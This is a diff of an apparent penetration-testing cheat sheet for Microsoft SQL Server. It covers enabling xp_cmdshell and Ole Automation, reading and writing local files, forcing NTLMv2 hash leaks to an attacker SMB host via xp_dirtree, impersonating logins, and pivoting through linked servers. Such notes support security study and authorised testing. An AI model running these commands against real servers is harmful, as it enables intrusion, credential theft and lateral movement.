@@ -19,30 +19,19 @@ If we have appropriate privileges, we can enable `xp_cmdshell`:
 ```mysql
 -- To allow advanced options to be changed.  
 > EXECUTE sp_configure 'show advanced options', 1
-
--- To update the currently configured value for advanced options.  
 > RECONFIGURE
- 
--- To enable the feature.  
 > EXECUTE sp_configure 'xp_cmdshell', 1
-  
--- To update the currently configured value for this feature.  
-RECONFIGURE
-
+> RECONFIGURE
 ```
 There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Or additional functionalities like the `xp_regwrite` command, used to elevate privileges by creating new entries in the Windows registry.
 # Write Local Files
 >Required Admin privileges to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)
 ## 1. Enable Ole Automation Procedures
 ```mysql
-1> sp_configure 'show advanced options', 1
-2> GO
-3> RECONFIGURE
-4> GO
-5> sp_configure 'Ole Automation Procedures', 1
-6> GO
-7> RECONFIGURE
-8> GO
+> sp_configure 'show advanced options', 1
+> RECONFIGURE
+> sp_configure 'Ole Automation Procedures', 1
+> RECONFIGURE
 ```
 ## 2. Create File
 ```mysql
@@ -59,14 +48,12 @@ There are other methods to get command execution, such as adding [extended stor
 >Same read permission as the system account.
 ```sql
 1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-2> GO
 ```
 # Capture Service Hash
 The undocumented stored procedures `xp_subdirs` and `xp_dirtree` uses SMB protocol to retrieve a list of child directories. We can use a stored procedure and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
 
 ```mysql
-1> EXEC master..<xp_dirtree/xp_subdirs> '\\10.10.110.17\share\'
-2> GO
+1> EXEC master..<xp_dirtree/xp_subdirs> '\\<OUR-IP>\share\'
 ```
 If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
 >Relay might not work on same host as Windows patched it for originating system.
@@ -94,12 +81,11 @@ $ impacket-smbserver share ./ -smb2support
 >Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.
 ## Identify Users to Impersonate
 ```mysql
-1> SELECT distinct b.name
-2> FROM sys.server_permissions a
-3> INNER JOIN sys.server_principals b
-4> ON a.grantor_principal_id = b.principal_id
-5> WHERE a.permission_name = 'IMPERSONATE'
-6> GO
+> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+```
+
+```mysql
+> SELECT DISTINCT name FROM sys.sysusers;
 ```
 >**Note:** If a user isn't sysadmin, they still might be able to access other databases or linked servers
 ## Verify Current User/Role
@@ -123,20 +109,27 @@ We should see `1` for a successful transaction
 If an SQL server has linked server configured, we could move laterally to that database server. If it is configured using credentials from remote server, and those credentials have sysadmin privileges, we could execute commands on that remote SQL instance.
 ## Identify Linked Servers
 ```mysql
-1> SELECT srvname, isremote FROM sysservers
-2> GO
+> SELECT srvname, isremote FROM sysservers
 ```
 `1` means a remote server, `0` means a linked server.
 ## Identify User
 Identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement sends pass-through commands to linked servers.
+## Send Commands to Linked Server
+Once we switched our user using `EXECUTE AS LOGIN = 'user'`, we can send commands to the linked server.
 ```mysql
-1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP>\<LINKED-SERVER>]
-2> GO
+> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP>\<LINKED-SERVER>]
 
 ------------------------------ ------------------------------ 
 DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote
 ```
 >**Note:** If we need to use quotes in our query to the linked server, use single double quotes to escape the single quote. To run multiples commands at once, divide them up with a semi colon (;)
+
+## Useful
+```mysql
+> EXEC sp_linkedservers;
+> EXEC sp_helplinkedsrvlogin 'LOCAL.TEST.LINKED.SRV';
+> SELECT * FROM [LOCAL.TEST.LINKED.SRV].master.sys.databases;
+```
 # Clients
 Clients to access MSSQL:
 ### Linux
